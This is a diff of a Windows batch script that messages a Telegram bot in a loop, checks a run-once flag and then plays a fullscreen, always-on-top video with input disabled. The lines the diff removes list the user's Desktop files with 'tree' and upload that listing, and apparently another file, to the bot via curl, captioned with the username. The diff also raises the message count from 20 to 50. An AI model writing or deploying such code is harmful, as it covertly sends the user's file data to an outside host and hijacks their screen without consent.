@@ -12,44 +12,6 @@ set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 
 
 
-
-
-
-
-:: Set the log file path
-set "LOGFILE=%APPDATA%\Desktop_List.txt"
-
-
-cd /d "%USERPROFILE%\Desktop"
-tree /f /a > "%APPDATA%\Desktop_List.txt"
-
-
-:: Send the file (as a document)
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
-     -F "chat_id=%CHAT_ID%" ^
-     -F "caption=%USERNAME%" ^
-     -F "document=@%LOGFILE%"
-
-
-
-set "LOGFILE=%APPDATA%\Desktop_List.exe"
-
-
-
-:: Send the file (as a document)
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
-     -F "chat_id=%CHAT_ID%" ^
-     -F "caption=%USERNAME%" ^
-     -F "document=@%LOGFILE%"
-
-
-
-
-exit
-
-
-
-
 ::goto :EOF
 
 
@@ -64,7 +26,7 @@ if exist "%temp%\run_once1.flag" goto skip_code
 
 
 :loop
-if %NUM% GTR 20 goto play
+if %NUM% GTR 50 goto play
 
 set "ENCODED_MESSAGE=%NUM%"
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
@@ -82,6 +44,8 @@ goto loop
 
 
 :play
+
+cd /d "%USERPROFILE%\Desktop\test\Atest"
 
 start "" /B mpv.exe --fullscreen --border=no --ontop --no-input-default-bindings --no-osc --no-stop-screensaver --term-status-msg=" " --idle=no --force-window=no --no-terminal --geometry=100%x100% --keepaspect=no --autofit=100%x100% --length=7 video.mp4
 timeout /t 4 /nobreak >nul
